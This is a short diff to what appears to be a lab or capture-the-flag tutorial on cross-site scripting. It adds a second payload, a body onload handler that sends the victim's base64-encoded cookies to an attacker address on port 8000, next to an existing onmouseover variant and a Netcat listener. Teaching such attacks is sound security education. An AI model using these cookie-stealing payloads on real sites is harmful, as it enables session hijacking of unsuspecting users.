@@ -238,6 +238,11 @@ Instead of a cookie-logging script, we could have also used the venerable Netcat
 <h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
 ```
 
+Or another possible payload:
+
+```js
+<body onload='document.write(`<img src="http://10.10.14.195:8000?cookie=${btoa(document.cookie)}">`);'> <h1>test</h1> </body>
+```
 
 ```bash
 nc -nlvp 8000
